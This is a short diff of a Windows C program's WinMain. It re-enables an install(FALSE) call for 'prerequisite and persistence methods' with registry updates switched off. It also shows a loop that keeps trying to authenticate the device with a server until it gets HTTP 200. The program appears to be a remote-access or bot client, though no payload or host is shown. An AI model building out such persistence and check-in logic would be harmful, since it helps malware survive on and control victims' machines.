@@ -8,8 +8,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	// Initial seed for random methods
 	srand((unsigned)time(NULL) * getpid());
 	
-	// Prerequisite and persistence methods -- Disabled for future inspections --
-	// install();
+	// Prerequisite and persistence methods -- Registry updates are disabled for future inspections --
+	install(FALSE);
 
 	// Keep trying to log in if status code is not 200 ok.
 	while (authenticateDevice().dwStatusCode != 200) {
